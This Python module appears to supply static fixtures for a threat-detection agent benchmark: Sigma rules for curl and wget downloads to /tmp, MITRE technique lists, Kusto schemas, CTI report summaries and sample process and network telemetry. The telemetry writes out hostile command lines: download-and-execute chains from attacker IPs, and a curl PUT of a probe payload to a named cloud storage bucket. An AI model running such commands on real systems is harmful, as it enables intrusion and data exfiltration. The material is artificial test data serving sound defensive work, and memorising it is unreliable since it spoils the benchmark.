"""Static CTI data for the qwen-pwn agent harness.

Faithful stand-ins for the CTI-REALM environment tools:
  - search_sigma_rules / search_mitre_techniques
  - list_kusto_tables / get_table_schema / sample_table_data / execute_kql_query
  - list_cti_report_tags / get_cti_reports_by_tag
"""

# ---------------------------------------------------------------- Sigma rules
SIGMA_RULES = [
    {
        "title": "File Downloaded via Curl to /tmp",
        "id": "qpwn-001",
        "status": "stable",
        "description": "Detects curl downloading a file to /tmp, a common malware staging location.",
        "references": ["https://attack.mitre.org/techniques/T1105/"],
        "tags": ["attack.command_and_control", "attack.t1105", "attack.execution"],
        "logsource": {"category": "process_creation", "product": "linux"},
        "detection": {
            "selection": {
                "Image|endswith": "/curl",
                "CommandLine|contains|all": ["-o /tmp/", "http"],
            },
            "condition": "selection",
        },
        "falsepositives": [
            "Administrators downloading files manually",
            "Package managers",
        ],
    },
    {
        "title": "Bash Execution of File in /tmp",
        "id": "qpwn-002",
        "status": "stable",
        "description": "Detects execution of a bash script located in /tmp.",
        "references": ["https://attack.mitre.org/techniques/T1059.004/"],
        "tags": ["attack.execution", "attack.t1059.004", "attack.defense_evasion"],
        "logsource": {"category": "process_creation", "product": "linux"},
        "detection": {
            "selection": {
                "Image|endswith": "/bash",
                "CommandLine|startswith": "bash /tmp/",
            },
            "condition": "selection",
        },
        "falsepositives": ["Legitimate scripts run from /tmp by admins"],
    },
    {
        "title": "Download and Execute Pattern (curl pipe bash)",
        "id": "qpwn-003",
        "status": "test",
        "description": "Detects the classic download-and-execute pattern: curl piped directly to bash.",
        "references": ["https://attack.mitre.org/techniques/T1059.004/"],
        "tags": ["attack.execution", "attack.t1059.004", "attack.t1105"],
        "logsource": {"category": "process_creation", "product": "linux"},
        "detection": {
            "selection": {
                "CommandLine|re": "curl.+(\\||bash|sh)\\s*$",
            },
            "condition": "selection",
        },
        "falsepositives": ["Developer workflows"],
    },
    {
        "title": "Ingress Tool Transfer via Curl",
        "id": "qpwn-004",
        "status": "stable",
        "description": "Detects curl with common download flags (--data-binary, -O, -o) touching external hosts.",
        "references": ["https://attack.mitre.org/techniques/T1105/"],
        "tags": ["attack.command_and_control", "attack.t1105"],
        "logsource": {"category": "process_creation", "product": "linux"},
        "detection": {
            "selection": {
                "Image|endswith": "/curl",
                "CommandLine|contains": "-o",
            },
            "condition": "selection",
        },
        "falsepositives": ["Automated update mechanisms"],
    },
    {
        "title": "Suspicious Script Execution from Temporary Directory",
        "id": "qpwn-005",
        "status": "stable",
        "description": "Detects scripts executed from /tmp, /var/tmp, or /dev/shm.",
        "references": ["https://attack.mitre.org/techniques/T1059.004/"],
        "tags": [
            "attack.execution",
            "attack.t1059.004",
            "attack.defense_evasion",
            "attack.t1074",
        ],
        "logsource": {"category": "process_creation", "product": "linux"},
        "detection": {
            "selection": {
                "CommandLine|re": "(bash|sh|python3?)\\s+(/tmp/|/var/tmp/|/dev/shm/)",
            },
            "condition": "selection",
        },
        "falsepositives": ["Admin scripts"],
    },
    {
        "title": "Wget File Download",
        "id": "qpwn-006",
        "status": "stable",
        "description": "Detects wget downloading files, sibling of curl-based transfer.",
        "references": ["https://attack.mitre.org/techniques/T1105/"],
        "tags": ["attack.command_and_control", "attack.t1105"],
        "logsource": {"category": "process_creation", "product": "linux"},
        "detection": {
            "selection": {"Image|endswith": "/wget"},
            "condition": "selection",
        },
        "falsepositives": ["Package updates"],
    },
]

# ---------------------------------------------------------------- MITRE ATT&CK
MITRE_TECHNIQUES = {
    "execution": [
        {
            "id": "T1059",
            "name": "Command and Scripting Interpreter",
            "description": "Adversaries abuse command and script interpreters to execute commands, scripts, or binaries.",
        },
        {
            "id": "T1059.004",
            "name": "Unix Shell",
            "description": "Adversaries abuse Unix shells to execute commands and scripts. curl download + bash execution is a canonical pattern.",
        },
        {
            "id": "T1059.009",
            "name": "Cloud API",
            "description": "Adversaries use cloud APIs to execute commands.",
        },
        {
            "id": "T1106",
            "name": "Native API",
            "description": "Adversaries use native OS APIs for execution.",
        },
    ],
    "command and control": [
        {
            "id": "T1105",
            "name": "Ingress Tool Transfer",
            "description": "Adversaries may transfer tools or files from an external system to a compromised environment, e.g. curl -o /tmp/x http://c2/x.",
        },
        {
            "id": "T1041",
            "name": "Exfiltration Over C2 Channel",
            "description": "Data exfiltrated over an existing C2 channel.",
        },
        {
            "id": "T1071",
            "name": "Application Layer Protocol",
            "description": "Communication using application layer protocols such as HTTP/S.",
        },
    ],
    "persistence": [
        {
            "id": "T1053.003",
            "name": "Cron",
            "description": "Adversaries abuse cron for persistence.",
        },
        {
            "id": "T1543.002",
            "name": "Systemd Service",
            "description": "Adversaries abuse systemd services.",
        },
    ],
    "defense evasion": [
        {
            "id": "T1070.004",
            "name": "File Deletion",
            "description": "Adversaries delete files after execution to cover tracks.",
        },
        {
            "id": "T1027",
            "name": "Obfuscated Files or Information",
            "description": "Adversaries obfuscate scripts, e.g. base64 payloads decoded to /tmp.",
        },
    ],
    "exfiltration": [
        {
            "id": "T1041",
            "name": "Exfiltration Over C2 Channel",
            "description": "Data sent over C2.",
        },
        {
            "id": "T1567.002",
            "name": "Exfiltration to Cloud Storage",
            "description": "Data pushed to cloud storage buckets (S3/OSS).",
        },
    ],
    "discovery": [
        {
            "id": "T1082",
            "name": "System Information Discovery",
            "description": "Adversaries gather system info.",
        },
        {
            "id": "T1087",
            "name": "Account Discovery",
            "description": "Adversaries enumerate accounts.",
        },
    ],
    "credential access": [
        {
            "id": "T1552.001",
            "name": "Credentials In Files",
            "description": "Credentials harvested from files.",
        },
        {
            "id": "T1056",
            "name": "Input Capture",
            "description": "Adversaries capture user input.",
        },
    ],
    "collection": [
        {
            "id": "T1560",
            "name": "Archive Collected Data",
            "description": "Collected data archived before exfiltration.",
        },
    ],
    "lateral movement": [
        {
            "id": "T1021",
            "name": "Remote Services",
            "description": "Adversaries use remote services.",
        },
    ],
    "impact": [
        {
            "id": "T1489",
            "name": "Service Stop",
            "description": "Adversaries stop services.",
        },
    ],
    "privilege escalation": [
        {
            "id": "T1068",
            "name": "Exploitation for Privilege Escalation",
            "description": "Adversaries exploit vulnerabilities for elevation.",
        },
    ],
}

# ---------------------------------------------------------------- Kusto tables
KUSTO_TABLES = {
    "DeviceProcess": {
        "description": "Process creation events (Linux auditd / eBPF sourced).",
        "columns": {
            "Timestamp": "datetime",
            "DeviceId": "string",
            "InitiatingProcessId": "int",
            "ProcessId": "int",
            "ParentFileName": "string",
            "FileName": "string",
            "FolderPath": "string",
            "CommandLine": "string",
            "AccountName": "string",
            "ProcessIntegrityLevel": "string",
            "InitiatingProcessCommandLine": "string",
        },
    },
    "DeviceNetworkEvents": {
        "description": "Network connection events.",
        "columns": {
            "Timestamp": "datetime",
            "DeviceId": "string",
            "RemoteIP": "string",
            "RemotePort": "int",
            "Protocol": "string",
            "InitiatingProcessFileName": "string",
            "InitiatingProcessCommandLine": "string",
            "RemoteUrl": "string",
        },
    },
    "DeviceFileEvents": {
        "description": "File creation / modification events.",
        "columns": {
            "Timestamp": "datetime",
            "DeviceId": "string",
            "ActionType": "string",
            "FileName": "string",
            "FolderPath": "string",
            "FileSize": "long",
            "InitiatingProcessCommandLine": "string",
            "SHA256": "string",
        },
    },
    "DeviceLogonEvents": {
        "description": "Logon events.",
        "columns": {
            "Timestamp": "datetime",
            "DeviceId": "string",
            "ActionType": "string",
            "AccountName": "string",
            "LogonType": "int",
        },
    },
    "ThreatIntelligenceIndicator": {
        "description": "TI indicators.",
        "columns": {
            "Timestamp": "datetime",
            "IndicatorValue": "string",
            "IndicatorType": "string",
            "ThreatType": "string",
            "Description": "string",
        },
    },
}

# Sample process telemetry featuring the curl->/tmp->bash kill chain
SAMPLE_ROWS = {
    "DeviceProcess": [
        {
            "Timestamp": "2026-10-26T09:14:01.112Z",
            "DeviceId": "dev-linux-04",
            "InitiatingProcessId": 1188,
            "ProcessId": 2231,
            "ParentFileName": "bash",
            "FileName": "curl",
            "FolderPath": "/usr/bin",
            "CommandLine": "curl -s -o /tmp/update.sh http://203.0.113.55/update.sh",
            "AccountName": "svc-app",
            "InitiatingProcessCommandLine": "bash /opt/app/start.sh",
        },
        {
            "Timestamp": "2026-10-26T09:14:03.318Z",
            "DeviceId": "dev-linux-04",
            "InitiatingProcessId": 2231,
            "ProcessId": 2240,
            "ParentFileName": "curl",
            "FileName": "bash",
            "FolderPath": "/usr/bin",
            "CommandLine": "bash /tmp/update.sh",
            "AccountName": "svc-app",
            "InitiatingProcessCommandLine": "curl -s -o /tmp/update.sh http://203.0.113.55/update.sh",
        },
        {
            "Timestamp": "2026-10-26T09:31:44.902Z",
            "DeviceId": "dev-linux-04",
            "InitiatingProcessId": 1188,
            "ProcessId": 3081,
            "ParentFileName": "bash",
            "FileName": "curl",
            "FolderPath": "/usr/bin",
            "CommandLine": "curl -s -m 10 -o /tmp/put_probe -X PUT --data-binary PROBE_PAYLOAD_ABC123 http://sanmaohe.oss-cn-beijing.aliyuncs.com/upload/test.bin -w HTTP:%{http_code}",
            "AccountName": "svc-app",
            "InitiatingProcessCommandLine": "bash /opt/app/start.sh",
        },
        {
            "Timestamp": "2026-10-26T09:41:17.550Z",
            "DeviceId": "dev-linux-07",
            "InitiatingProcessId": 902,
            "ProcessId": 5120,
            "ParentFileName": "bash",
            "FileName": "python3",
            "FolderPath": "/usr/bin",
            "CommandLine": "python3 /opt/scripts/inventory.py",
            "AccountName": "root",
            "InitiatingProcessCommandLine": "cron -f",
        },
        {
            "Timestamp": "2026-10-26T10:02:51.780Z",
            "DeviceId": "dev-linux-04",
            "InitiatingProcessId": 4102,
            "ProcessId": 4103,
            "ParentFileName": "bash",
            "FileName": "wget",
            "FolderPath": "/usr/bin",
            "CommandLine": "wget -O /tmp/stage2 http://198.51.100.23/stage2",
            "AccountName": "svc-app",
            "InitiatingProcessCommandLine": "bash /tmp/update.sh",
        },
        {
            "Timestamp": "2026-10-26T10:02:53.001Z",
            "DeviceId": "dev-linux-04",
            "InitiatingProcessId": 4103,
            "ProcessId": 4104,
            "ParentFileName": "wget",
            "FileName": "bash",
            "FolderPath": "/usr/bin",
            "CommandLine": "bash /tmp/stage2",
            "AccountName": "svc-app",
            "InitiatingProcessCommandLine": "wget -O /tmp/stage2 http://198.51.100.23/stage2",
        },
    ],
    "DeviceNetworkEvents": [
        {
            "Timestamp": "2026-10-26T09:14:01.150Z",
            "DeviceId": "dev-linux-04",
            "RemoteIP": "203.0.113.55",
            "RemotePort": 80,
            "Protocol": "Http",
            "InitiatingProcessFileName": "curl",
            "InitiatingProcessCommandLine": "curl -s -o /tmp/update.sh http://203.0.113.55/update.sh",
            "RemoteUrl": "http://203.0.113.55/update.sh",
        },
        {
            "Timestamp": "2026-10-26T09:31:44.930Z",
            "DeviceId": "dev-linux-04",
            "RemoteIP": "47.94.20.11",
            "RemotePort": 80,
            "Protocol": "Http",
            "InitiatingProcessFileName": "curl",
            "InitiatingProcessCommandLine": "curl -s -m 10 -o /tmp/put_probe -X PUT ...",
            "RemoteUrl": "http://sanmaohe.oss-cn-beijing.aliyuncs.com/upload/test.bin",
        },
    ],
    "DeviceFileEvents": [
        {
            "Timestamp": "2026-10-26T09:14:01.230Z",
            "DeviceId": "dev-linux-04",
            "ActionType": "FileCreated",
            "FileName": "update.sh",
            "FolderPath": "/tmp",
            "FileSize": 812,
            "InitiatingProcessCommandLine": "curl -s -o /tmp/update.sh http://203.0.113.55/update.sh",
            "SHA256": "9f2a1bc4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2",
        },
        {
            "Timestamp": "2026-10-26T09:31:44.950Z",
            "DeviceId": "dev-linux-04",
            "ActionType": "FileCreated",
            "FileName": "put_probe",
            "FolderPath": "/tmp",
            "FileSize": 20,
            "InitiatingProcessCommandLine": "curl -s -m 10 -o /tmp/put_probe -X PUT ...",
            "SHA256": "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3",
        },
    ],
    "DeviceLogonEvents": [
        {
            "Timestamp": "2026-10-26T08:59:01.000Z",
            "DeviceId": "dev-linux-04",
            "ActionType": "LogonSuccess",
            "AccountName": "svc-app",
            "LogonType": 5,
        },
    ],
    "ThreatIntelligenceIndicator": [
        {
            "Timestamp": "2026-10-20T00:00:00.000Z",
            "IndicatorValue": "203.0.113.55",
            "IndicatorType": "Ip",
            "ThreatType": "Botnet",
            "Description": "Known dropper distribution host (curl download-and-execute)",
        },
        {
            "Timestamp": "2026-10-22T00:00:00.000Z",
            "IndicatorValue": "sanmaohe.oss-cn-beijing.aliyuncs.com",
            "IndicatorType": "DomainName",
            "ThreatType": "C2",
            "Description": "Suspicious OSS bucket receiving PUT canaries",
        },
    ],
}

# ---------------------------------------------------------------- CTI reports
CTI_TAGS = [
    "curl",
    "download-and-execute",
    "linux",
    "bash",
    "dropper",
    "c2",
    "oss",
    "malware-delivery",
    "stager",
]

CTI_REPORTS = {
    "curl": [
        {
            "title": "Linux droppers increasingly use curl to /tmp",
            "summary": "Multiple Linux botnet stagers observed using 'curl -o /tmp/<file> http://...' followed by bash execution. Recommend process_creation detection on curl CommandLine containing '-o /tmp/'.",
            "tags": ["curl", "download-and-execute", "linux"],
            "date": "2026-09-30",
        },
        {
            "title": "Dropper writes canary to object storage",
            "summary": "A stager family PUTs a fixed payload string to an Aliyun OSS bucket for tracking. curl -X PUT --data-binary usage noted.",
            "tags": ["curl", "oss", "c2"],
            "date": "2026-10-18",
        },
    ],
    "download-and-execute": [
        {
            "title": "Download-and-execute remains top Linux delivery",
            "summary": "The curl (or wget) to /tmp followed by bash pattern accounts for 38% of observed Linux intrusions in Q3 2026. Correlate process_creation events: parent curl/wget, child bash, file path under /tmp.",
            "tags": ["download-and-execute", "bash", "linux"],
            "date": "2026-10-01",
        },
    ],
    "bash": [
        {
            "title": "Bash script execution from world-writable dirs",
            "summary": "Execution of scripts from /tmp, /var/tmp, /dev/shm is a strong intrusion indicator. Combine with parent process of curl/wget.",
            "tags": ["bash", "linux"],
            "date": "2026-08-12",
        },
    ],
    "linux": [
        {
            "title": "Linux intrusion trends Q3 2026",
            "summary": "T1059.004 (Unix Shell) and T1105 (Ingress Tool Transfer) dominate execution and C2. curl is the most common transfer tool.",
            "tags": ["linux", "curl", "download-and-execute"],
            "date": "2026-10-05",
        },
    ],
    "c2": [
        {
            "title": "Object-storage C2 channels",
            "summary": "Attackers abuse S3/OSS buckets as lightweight C2: PUT for beacon, GET for commands. Look for curl -X PUT with small --data-binary payloads to cloud storage domains.",
            "tags": ["c2", "oss"],
            "date": "2026-09-14",
        },
    ],
    "oss": [
        {
            "title": "Aliyun OSS abuse for canary drops",
            "summary": "Bucket sanmaohe.oss-cn-beijing.aliyuncs.com observed receiving PROBE payloads via unsigned PUTs.",
            "tags": ["oss", "c2", "curl"],
            "date": "2026-10-26",
        },
    ],
    "dropper": [
        {
            "title": "Multi-stage droppers on Linux servers",
            "summary": "Stage 1 curl download to /tmp, stage 2 bash execution, stage 3 persistent cron. Detect stage 1-2 transition.",
            "tags": ["dropper", "download-and-execute"],
            "date": "2026-07-22",
        },
    ],
    "malware-delivery": [
        {
            "title": "Malware delivery via shell downloaders",
            "summary": "Commodity malware delivered via curl|bash one-liners and two-step file drops. Monitor process lineage bash->curl->bash.",
            "tags": ["malware-delivery", "curl", "bash"],
            "date": "2026-10-11",
        },
    ],
    "stager": [
        {
            "title": "Stager families and their curl footprints",
            "summary": "Stagers use curl -s with -m timeouts, write to /tmp, and execute. The -m 10 timeout is common.",
            "tags": ["stager", "curl"],
            "date": "2026-09-02",
        },
    ],
}


def search_sigma_rules(
    keyword: str = "", technique_id: str = "", platform: str = "", limit: int = 5
) -> str:
    limit = max(1, min(int(limit or 5), 20))
    results = SIGMA_RULES
    if keyword:
        kw = keyword.lower()
        results = [
            r
            for r in results
            if kw in r["title"].lower()
            or kw in r["description"].lower()
            or any(kw in t for t in r["tags"])
        ]
    if technique_id:
        results = [
            r
            for r in results
            if any(technique_id.lower() in t.lower() for t in r["tags"])
        ]
    if platform:
        results = [
            r for r in results if r["logsource"].get("product") == platform.lower()
        ]
    return str(results[:limit])


def search_mitre_techniques(tactic: str) -> str:
    tactic = tactic.strip().lower()
    for key, val in MITRE_TECHNIQUES.items():
        if key == tactic:
            return str(val)
    return f"No techniques found for tactic '{tactic}'. Valid tactics: {list(MITRE_TECHNIQUES)}"


def list_kusto_tables() -> str:
    return str(
        [
            {"TableName": t, "Description": s["description"]}
            for t, s in KUSTO_TABLES.items()
        ]
    )


def get_table_schema(table_name: str) -> str:
    if table_name in KUSTO_TABLES:
        return str(
            {"TableName": table_name, "Columns": KUSTO_TABLES[table_name]["columns"]}
        )
    return f"Table '{table_name}' not found. Available: {list(KUSTO_TABLES)}"


def sample_table_data(table_name: str, rows: int = 5) -> str:
    rows = max(1, min(int(rows or 5), 20))
    if table_name in SAMPLE_ROWS:
        return str(SAMPLE_ROWS[table_name][:rows])
    return f"Table '{table_name}' not found. Available: {list(SAMPLE_ROWS)}"


def execute_kql_query(query: str, limit: int = 10) -> str:
    limit = max(1, min(int(limit or 10), 10))
    q = query.strip()
    lower = q.lower()
    # crude mini-KQL: FROM table [WHERE kw] [| take N] [| summarize count()]
    table = None
    for t in SAMPLE_ROWS:
        if t.lower() in lower:
            table = t
            break
    if not table:
        return f"Query executed: no recognizable table in '{q[:80]}...'. Available tables: {list(SAMPLE_ROWS)}"
    rows = SAMPLE_ROWS[table]
    # keyword filters after 'where' — keep rows matching ANY recognized token
    filtered = rows
    if "where" in lower:
        after = lower.split("where", 1)[1]
        for tok in (
            after.replace("==", " ").replace("contains", " ").replace("(", " ").split()
        ):
            tok = tok.strip("'\"(),")
            if len(tok) > 3 and tok not in (
                "deviceid",
                "timestamp",
                "project",
                "extend",
                "order",
                "summarize",
                "between",
                "datetime",
            ):
                matched = [
                    r
                    for r in filtered
                    if any(tok.lower() in str(v).lower() for v in r.values())
                ]
                if matched:
                    filtered = matched
    import json as _json

    if "summarize" in lower and "count()" in lower:
        return _json.dumps(
            [{"FileName": r.get("FileName", "?"), "cnt": 1} for r in filtered[:limit]],
            default=str,
        )
    return _json.dumps(filtered[:limit], default=str)


def list_cti_report_tags() -> str:
    return str(CTI_TAGS)


def get_cti_reports_by_tag(tag: str) -> str:
    return str(
        CTI_REPORTS.get(
            tag.strip().lower(), f"No reports for tag '{tag}'. Tags: {CTI_TAGS}"
        )
    )
